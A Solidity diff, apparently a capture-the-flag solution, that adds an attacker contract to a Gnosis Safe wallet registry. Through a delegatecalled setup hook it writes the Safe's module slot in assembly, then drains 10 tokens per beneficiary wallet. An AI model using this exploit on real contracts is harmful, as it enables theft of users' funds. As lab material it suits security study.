@@ -5,6 +5,7 @@ import "solady/src/auth/Ownable.sol";
 import "solady/src/utils/SafeTransferLib.sol";
 import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
 import "@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol";
+import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";
 import "@gnosis.pm/safe-contracts/contracts/proxies/IProxyCreationCallback.sol";
 
 /**
@@ -133,3 +134,79 @@ contract WalletRegistry is IProxyCreationCallback, Ownable {
         );
     }
 }
+
+contract WalletRegistryAttacker {
+    WalletRegistry internal immutable walletRegistry;
+    GnosisSafeProxyFactory internal immutable walletFactory;
+    GnosisSafe internal immutable masterCopy;
+    IERC20 internal immutable token;
+    address[] internal initialBeneficiaries;
+
+    constructor(
+        address _walletRegistry,
+        address[] memory _initialBeneficiaries
+    ) {
+        walletRegistry = WalletRegistry(_walletRegistry);
+        walletFactory = GnosisSafeProxyFactory(walletRegistry.walletFactory());
+        masterCopy = GnosisSafe(payable(walletRegistry.masterCopy()));
+        token = IERC20(walletRegistry.token());
+        initialBeneficiaries = _initialBeneficiaries;
+    }
+
+    function attack() external {
+        for (uint256 i = 0; i < initialBeneficiaries.length; i++) {
+            hackWallet(initialBeneficiaries[i]);
+        }
+    }
+
+    function hackWallet(address owner) internal {
+        address[] memory owners = new address[](1);
+        owners[0] = owner;
+        GnosisSafe safe = GnosisSafe(payable(walletFactory.createProxyWithCallback(
+            address(masterCopy),
+            abi.encodeWithSelector(
+                GnosisSafe.setup.selector,
+                owners,
+                1,
+                address(this),
+                abi.encodeWithSelector(this.moduleSetup.selector, address(this)),
+                address(0),
+                address(0),
+                0,
+                address(0)
+            ),
+            0,
+            walletRegistry
+        )));
+
+        bytes memory txData = abi.encodeWithSelector(
+            IERC20.transfer.selector,
+            msg.sender,
+            10 ether
+        );
+
+        safe.execTransactionFromModule(
+            address(token),
+            0,
+            txData,
+            Enum.Operation.Call
+        );
+    }
+
+    // storage layout of gnosis safe
+    // 0 => address private singleton;
+    // 1 => mapping(address => address) internal modules;
+    // 2 => mapping(address => address) internal owners;
+    // 3 => uint256 internal ownerCount;
+    // 4 => uint256 internal threshold;
+
+    // mappings stored at keccak256(h(k) . p)
+
+    function moduleSetup(address attacker) public {
+        uint256 moduleStorageSlot = uint256(keccak256(abi.encode(attacker, 1)));
+        assembly {
+            sstore(moduleStorageSlot, 0x1)
+        }
+    }
+}
+
